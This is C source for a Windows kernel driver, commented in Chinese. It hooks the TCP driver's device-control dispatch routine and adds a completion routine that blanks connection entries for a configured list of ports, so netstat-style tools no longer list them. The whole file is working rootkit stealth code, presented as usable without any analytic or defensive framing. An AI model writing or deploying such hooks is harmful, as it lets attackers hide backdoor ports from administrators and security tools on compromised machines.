#include <ntddk.h>
#include "cfg.h"

#define CO_TL_ENTITY 0x400
#define CL_TL_ENTITY 0x401
#define IOCTL_TCP_QUERY_INFORMATION_EX 0x00120003
#define HTONS(a) (((0xFF&a)<<8) + ((0xFF00&a)>>8))

typedef struct TDIEntityID
{
    ULONG tei_entity;
    ULONG tei_instance;
}TDIEntityID;

typedef struct TDIObjectID
{
    TDIEntityID toi_entity;
    ULONG toi_class;
    ULONG toi_type;
    ULONG toi_id;
}TDIObjectID;

typedef struct _CONNINFO101
{
    unsigned long status;
    unsigned long src_addr;
    unsigned short src_port;
    unsigned short unk1;
    unsigned long dst_addr;
    unsigned short dest_port;
    unsigned short unk2;
}CONNINFO101,*PCONNINFO101;

typedef struct _CONNINFO102
{
    unsigned long status;
    unsigned long src_addr;
    unsigned short src_port;
    unsigned short unk1;
    unsigned long dst_addr;
    unsigned short dst_port;
    unsigned short unk2;
    unsigned long pid;
}CONNINFO102,*PCONNINFO102;

typedef struct _CONNINFO110
{
    unsigned long size;
    unsigned long status;
    unsigned long src_addr;
    unsigned short src_port;
    unsigned short unk1;
    unsigned long dst_addr;
    unsigned short dst_port;
    unsigned short unk2;
    unsigned long pid;
    PVOID unk3[35];
}CONNINFO110,*PCONNINFO110;

typedef struct _REQINFO
{
    PIO_COMPLETION_ROUTINE OldCompletion;
    unsigned long ReqType;
}REQINFO,*PREQINFO;

PFILE_OBJECT pFile_tcp;
PDEVICE_OBJECT pDev_tcp;
PDRIVER_OBJECT pDrv_tcpip;

typedef NTSTATUS (*OLDIRPMJDEVICECONTROL)(IN PDEVICE_OBJECT,IN PIRP);
OLDIRPMJDEVICECONTROL OldIrpMjDeviceControl;

int istohide(int sport)
{
	int i;
	
	for(i=0;i<PTNUM;i++)
	{
		if(sport==PORTTOHIDE[i])
		{
			return 1;
		}
	}
	
	return 0;
}

NTSTATUS IoCompletionRoutine( IN PDEVICE_OBJECT DeviceObject,
                              IN PIRP Irp,
                              IN PVOID Context )
/*
* 如果将端口的状态信息改为0,则端口就不显示
* 各个端口状态信息如下:
*  1 = CLOSED
*  2 = LISTENING
*  3 = SYN_SENT
*  4 = SYN_RECEIVED
*  5 = ESTABLISHED
*  6 = FIN_WAIT_1
*  7 = FIN_WAIT_2
*  8 = CLOSE_WAIT
*  9 = CLOSING
*  ......
*/
{
    PVOID OutputBuffer;
    ULONG NumOutputBuffers;
    PIO_COMPLETION_ROUTINE p_compRoutine;
    ULONG i;

    OutputBuffer = Irp->UserBuffer;
//将以前的Irp中的完成函数的指针恢复
    p_compRoutine = ((PREQINFO)Context)->OldCompletion;
//以下为判断各种网络请求的参数类型
    if (((PREQINFO)Context)->ReqType == 0x101)
    {
        NumOutputBuffers = Irp->IoStatus.Information / sizeof(CONNINFO101);
        for ( i = 0;i < NumOutputBuffers;i ++ )
        {
            //在这里隐藏端口
            if (istohide( HTONS(((PCONNINFO101)OutputBuffer)[i].src_port)) )
            {
                ((PCONNINFO101)OutputBuffer)[i].status = 0;
            }
        }
    }
    else if (((PREQINFO)Context)->ReqType == 0x102)
    {
        NumOutputBuffers = Irp->IoStatus.Information / sizeof(CONNINFO102);
        for ( i = 0;i < NumOutputBuffers;i ++ )
        {
            if (istohide( HTONS(((PCONNINFO102)OutputBuffer)[i].src_port) ) )
            {
                ((PCONNINFO102)OutputBuffer)[i].status = 0;
            }
        }
    }
    else if (((PREQINFO)Context)->ReqType == 0x110)
    {
        NumOutputBuffers = Irp->IoStatus.Information / sizeof(CONNINFO110);
        for ( i = 0;i < NumOutputBuffers;i ++ )
        {
            if (istohide( HTONS(((PCONNINFO110)OutputBuffer)[i].src_port) ) )
            {
                ((PCONNINFO110)OutputBuffer)[i].status = 0;
            }
        }
    }
//释放在Hook中分配的内存
    ExFreePool(Context);

    if ( (Irp->StackCount > (ULONG)1) && (p_compRoutine != NULL) )
    {
        //如果以前的IRP中有完成例程,就调用以前的完成例程
        return (p_compRoutine)(DeviceObject,Irp,NULL);
    }
    else
    {
        //如果以前的Irp没有完成例程,就返回本Hook的状态
        return Irp->IoStatus.Status;
    }
}

NTSTATUS HookedDeviceControl(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp)
{
    PIO_STACK_LOCATION irpStack;
    ULONG ioTransferType;
    TDIObjectID *inputBuffer;
    ULONG context;

    irpStack = IoGetCurrentIrpStackLocation(Irp);
//判断当前IRP栈单元的IRP_MJ_*例程
    switch ( irpStack->MajorFunction )
    {
    case IRP_MJ_DEVICE_CONTROL:
        //如果IRP的次功能号为0且IOCTL查询代码为IOCTL_TCP_QUERY_INFORMATION_EX,
        //说明是应用层程序通过netstat.exe之类的程序请求查询TCP端口号信息
        if ((irpStack->MinorFunction == 0) && (irpStack->Parameters.DeviceIoControl.IoControlCode == IOCTL_TCP_QUERY_INFORMATION_EX))
        {
            //得到IoControlCode中的请求类型,判断是否为METHOD_NEITHER方式的Irp
            //ioTransferType &= 3;是得到CTL_CODE中Irp的请求方式(METHOD_BUFFERED,METHOD_IN_DIRECT or METHOD_OUT_DIRECT,MOTHOD_NEITHER)
            ioTransferType = irpStack->Parameters.DeviceIoControl.IoControlCode;
            ioTransferType &= 3;
            if ( ioTransferType == METHOD_NEITHER )
            {
                //MOTHOD_NEITHER方式的Irp的输入缓冲区在Type3InputBuffer中
                inputBuffer = (TDIObjectID *)irpStack->Parameters.DeviceIoControl.Type3InputBuffer;
                //如果TDIObjectID的请求方式为CO_TL_ENTITY类型,说明是请求查询TCP端口信息
                if ( inputBuffer->toi_entity.tei_entity == CO_TL_ENTITY )
                {
                    //0x101,0x102,0x110为应用层程序查询时所带的不同参数
                    if ( (inputBuffer->toi_id == 0x101) || (inputBuffer->toi_id == 0x102) || (inputBuffer->toi_id == 0x110) )
                    {
                        //改变Irp栈单元的控制位标志
                        irpStack->Control = 0;
                        irpStack->Control |= SL_INVOKE_ON_SUCCESS;
                        //在Irp的栈单元中分配一个上下文,保存以前Irp的完成例程和应用层参数信息
                        irpStack->Context = (PIO_COMPLETION_ROUTINE)ExAllocatePool(NonPagedPool,sizeof(REQINFO));
                        //保存旧的完成例程
                        ((PREQINFO)irpStack->Context)->OldCompletion = irpStack->CompletionRoutine;
                        ((PREQINFO)irpStack->Context)->ReqType = inputBuffer->toi_id;
                        //安装新的完成例程
                        //这步操作很重要,当钩住当前的TCP驱动对象以后,就可以先一步得到发送驱动程序的Irp
                        //在钩子函数中处理完这个Irp后要把这个Irp发给真正的TCP驱动程序
                        //在真正的TCP驱动程序处理完成这个Irp以后,我们的钩子函数唯一可以再得到这个Irp的方式是
                        //给这个Irp设置完成例程
                        irpStack->CompletionRoutine = (PIO_COMPLETION_ROUTINE)IoCompletionRoutine;
                    }
                }
            }
        }
        break;
    default:
        break;
    }
//调用以前的DeviceIoControl函数
    return OldIrpMjDeviceControl(DeviceObject,Irp);
}

NTSTATUS InstallTCPDriverHook()
{
    NTSTATUS ntStatus;
    UNICODE_STRING deviceTCPUnicodeString;
    WCHAR deviceTCPNameBuffer[] = L"\\Device\\Tcp";

    pFile_tcp = NULL;
    pDev_tcp = NULL;
    pDrv_tcpip = NULL;

	KdPrint(("Ports hooks \n"));
	
    RtlInitUnicodeString(&deviceTCPUnicodeString,deviceTCPNameBuffer);
//得到TCP驱动程序的设备对象和文件对象
    ntStatus = IoGetDeviceObjectPointer(&deviceTCPUnicodeString,FILE_READ_DATA,&pFile_tcp,&pDev_tcp);
    if ( !NT_SUCCESS(ntStatus) )
    {
        return ntStatus;
    }
//得到TCP设备对象对应的驱动程序对象
    pDrv_tcpip = pDev_tcp->DriverObject;
//保存以前TCP驱动对象中IRP_MJ_DEVICE_CONTROL函数的指针
    OldIrpMjDeviceControl = pDrv_tcpip->MajorFunction[IRP_MJ_DEVICE_CONTROL];
    if ( OldIrpMjDeviceControl )
    {
        //替换TCP驱动对象的IRP_MJ_DEVICE_CONTROL函数的指针为钩子函数的指针
        InterlockedExchange((PLONG)&pDrv_tcpip->MajorFunction[IRP_MJ_DEVICE_CONTROL],(LONG)HookedDeviceControl);
    }
    return STATUS_SUCCESS;
}

VOID PortUnload()
{
    if ( OldIrpMjDeviceControl )
    {
        //在这里恢复以前的函数入口地址
        pDrv_tcpip->MajorFunction[IRP_MJ_DEVICE_CONTROL] = OldIrpMjDeviceControl;
    }
    
    KdPrint(("Ports Unload \n"));
}
